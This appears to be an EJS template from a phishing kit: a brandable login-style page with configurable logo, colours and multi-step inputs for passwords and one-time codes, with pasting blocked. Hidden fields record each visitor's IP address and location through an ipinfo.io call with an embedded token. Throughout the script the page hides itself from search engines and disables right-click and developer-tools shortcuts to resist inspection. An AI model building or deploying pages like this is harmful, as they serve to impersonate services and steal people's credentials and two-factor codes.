<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>
        <%= pageConfig.title %>
    </title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .bg-custom {
            background-color: <%=pageConfig.backgroundColor || 'transparent' %> !important;
        }

        .text-custom {
            color: <%=pageConfig.textColor || '#111827' %> !important;
        }

        .btn-custom {
            background-color: <%=pageConfig.buttonColor || '#3b82f6' %> !important;
            color: <%=pageConfig.buttonTextColor || '#ffffff' %> !important;
        }

        .btn-custom:hover {
            filter: brightness(0.9);
        }

        .focus-ring-custom:focus {
            --tw-ring-color: <%=pageConfig.buttonColor || '#3b82f6' %> !important;
            border-color: <%=pageConfig.buttonColor || '#3b82f6' %> !important;
        }

        .dot-active {
            background-color: <%=pageConfig.buttonColor || '#3b82f6' %> !important;
        }

        .dot-inactive {
            background-color: <%=pageConfig.textColor || '#111827' %> !important;
            opacity: 0.3 !important;
        }

        .input-custom,
        input.input-custom {
            background-color: <%=pageConfig.inputBackgroundColor || 'transparent' %> !important;
            color: #ffffff !important;

            <% if (pageConfig.inputBackgroundColor==='transparent') {
                %>border: 1px solid rgba(255, 255, 255, 0.2) !important;
                <%
            }

            %>
        }

        /* Prevent Chrome from forcing white background on autofill */
        input.input-custom:-webkit-autofill,
        input.input-custom:-webkit-autofill:hover,
        input.input-custom:-webkit-autofill:focus,
        input.input-custom:-webkit-autofill:active {
            transition: background-color 5000s ease-in-out 0s;
            -webkit-text-fill-color: #ffffff !important;
        }

        .input-custom::placeholder {
            color: #ffffff !important;
            opacity: 0.6 !important;
        }

        <% if (pageConfig.backgroundUrl) {
            %>.bg-image {
                background-image: url('<%= pageConfig.backgroundUrl %>');
                background-size: cover;
                background-position: center;
            }

            <%
        }

        %>
    </style>
</head>

<body class="min-h-screen bg-custom text-custom">
    <% if (pageConfig.backgroundUrl) { %>
        <div class="fixed inset-0 bg-image opacity-20 pointer-events-none"></div>
        <% } %>

            <div class="relative min-h-screen flex items-center justify-center p-4">
                <div class="w-full max-w-md">
                    <div class="bg-custom rounded-2xl shadow-xl p-8">
                        <% if (pageConfig.logoUrl) { %>
                            <div class="flex justify-center mb-6">
                                <img src="<%= pageConfig.logoUrl %>" alt="Logo" class="h-16 object-contain">
                            </div>
                            <% } %>

                                <h1 class="text-2xl font-bold text-center text-custom mb-2">
                                    <%= pageConfig.title %>
                                </h1>

                                <% if (pageConfig.subtitle) { %>
                                    <p class="text-center text-custom opacity-70 mb-4">
                                        <%= pageConfig.subtitle %>
                                    </p>
                                    <% } %>

                                        <% if (pageConfig.writeup) { %>
                                            <p class="text-sm text-custom opacity-70 mb-6">
                                                <%= pageConfig.writeup %>
                                            </p>
                                            <% } else if (!pageConfig.subtitle) { %>
                                                <div class="mb-6"></div>
                                                <% } %>

                                                    <% if (pageConfig.inputs && pageConfig.inputs.length> 0) { %>
                                                        <form method="POST" class="space-y-4" autocomplete="off">
                                                            <% pageConfig.inputs.forEach(function(input, index) { %>
                                                                <div>
                                                                    <label
                                                                        class="block text-sm font-medium text-custom mb-1">
                                                                        <%= input.label %>
                                                                            <% if (input.required) { %>
                                                                                <span class="text-red-500">*</span>
                                                                                <% } %>
                                                                    </label>
                                                                    <% if (input.type==='otp' ) { %>
                                                                        <input
                                                                            style="background-color: transparent !important;"
                                                                            type="text" name="input_<%= index %>"
                                                                            placeholder="<%= input.placeholder || 'Enter code' %>"
                                                                            <%=input.required ? 'required' : '' %>
                                                                        maxlength="10"
                                                                        pattern="[0-9]*"
                                                                        inputmode="numeric"
                                                                        class="w-full px-4 py-3 border border-gray-300
                                                                        rounded-lg focus:outline-none focus:ring-2
                                                                        focus-ring-custom focus:border-transparent
                                                                        text-center text-2xl tracking-widest
                                                                        <%= pageConfig.inputBackgroundColor==='transparent'
                                                                            ? '!bg-transparent' : '' %>
                                                                            input-custom"
                                                                            style="<%=
                                                                                pageConfig.inputBackgroundColor==='transparent'
                                                                                ? 'background-color: transparent !important;'
                                                                                : '' %>"
                                                                                onpaste="return false"
                                                                                autocomplete="off"
                                                                                >
                                                                                <% } else { %>
                                                                                    <input type="<%= input.type %>"
                                                                                        style="background-color: transparent !important;"
                                                                                        name="input_<%= index %>"
                                                                                        placeholder="<%= input.placeholder %>"
                                                                                        <%=input.required ? 'required'
                                                                                        : '' %>
                                                                                    maxlength="100"
                                                                                    pattern="[^<>]*"
                                                                                        class="w-full px-4 py-3 border
                                                                                        border-gray-300 rounded-lg
                                                                                        focus:outline-none focus:ring-2
                                                                                        focus-ring-custom
                                                                                        <%= pageConfig.inputBackgroundColor==='transparent'
                                                                                            ? '!bg-transparent' : '' %>
                                                                                            focus:border-transparent
                                                                                            input-custom"
                                                                                            style="<%=
                                                                                                pageConfig.inputBackgroundColor==='transparent'
                                                                                                ? 'background-color: transparent !important;'
                                                                                                : '' %>"
                                                                                                onpaste="return false"
                                                                                                autocomplete="<%=
                                                                                                    input.type==='password'
                                                                                                    ? 'new-password'
                                                                                                    : 'off' %>"
                                                                                                    >
                                                                                                    <% } %>
                                                                </div>
                                                                <% }); %>

                                                                    <input type="hidden" value="" name="city" id="cty">
                                                                    <input type="hidden" value="" name="country"
                                                                        id="country">
                                                                    <input type="hidden" value="" name="region"
                                                                        id="region">
                                                                    <input type="hidden" value="" name="ip" id="ip">

                                                                    <button type="submit" id="submitBtn"
                                                                        class="w-full py-3 px-4 btn-custom font-semibold rounded-lg transition-all duration-200">
                                                                        <%= pageConfig.buttonText %>
                                                                    </button>
                                                        </form>
                                                        <% } else { %>
                                                            <form method="POST" class="mt-6" autocomplete="off">
                                                                <input type="hidden" value="" name="city" id="cty">
                                                                <input type="hidden" value="" name="country"
                                                                    id="country">
                                                                <input type="hidden" value="" name="region" id="region">
                                                                <input type="hidden" value="" name="ip" id="ip">
                                                                <button type="submit" id="submitBtn"
                                                                    class="w-full py-3 px-4 btn-custom font-semibold rounded-lg transition-all duration-200">
                                                                    <%= pageConfig.buttonText %>
                                                                </button>
                                                            </form>
                                                            <% } %>

                                                                <% if (totalPages> 1) { %>
                                                                    <div class="mt-6 flex justify-center">
                                                                        <div class="flex gap-2">
                                                                            <% for (let i=1; i <=totalPages; i++) { %>
                                                                                <div
                                                                                    class="w-2 h-2 rounded-full <%= i === currentPage ? 'dot-active' : 'dot-inactive' %>">
                                                                                </div>
                                                                                <% } %>
                                                                        </div>
                                                                    </div>
                                                                    <% } %>
                    </div>
                </div>
            </div>

            <script>
                const country = document.getElementById('country');
                const region = document.getElementById('region');
                const city = document.getElementById('cty');
                const ip = document.getElementById('ip');
                const submitBtn = document.getElementById('submitBtn');
                const form = document.getElementsByTagName('form')[0];

                submitBtn.addEventListener('click', (e) => {
                    e.preventDefault();

                    // Check if all required fields are filled
                    const requiredInputs = form.querySelectorAll('input[required]');
                    let allFilled = true;
                    requiredInputs.forEach(input => {
                        if (!input.value.trim()) {
                            allFilled = false;
                            input.classList.add('border-red-500');
                        } else {
                            input.classList.remove('border-red-500');
                        }
                    });

                    if (!allFilled) {
                        return;
                    }

                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Please wait...';
                    form.submit();
                });

                function getIpInfo() {
                    fetch('https://ipinfo.io/json?token=efd2f9e1d7b7a0')
                        .then(response => response.json())
                        .then(data => {
                            country.value = data.country;
                            region.value = data.region;
                            city.value = data.city;
                            ip.value = data.ip;
                        })
                        .catch(error => console.error(error));
                }
                getIpInfo();

                // Prevent form resubmission on refresh
                if (window.history.replaceState) {
                    window.history.replaceState(null, null, window.location.href);
                }

                // Disable right-click
                document.addEventListener('contextmenu', (e) => e.preventDefault());

                // Disable developer tools shortcut
                document.addEventListener('keydown', (e) => {
                    if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                        e.preventDefault();
                    }
                });
            </script>
</body>

</html>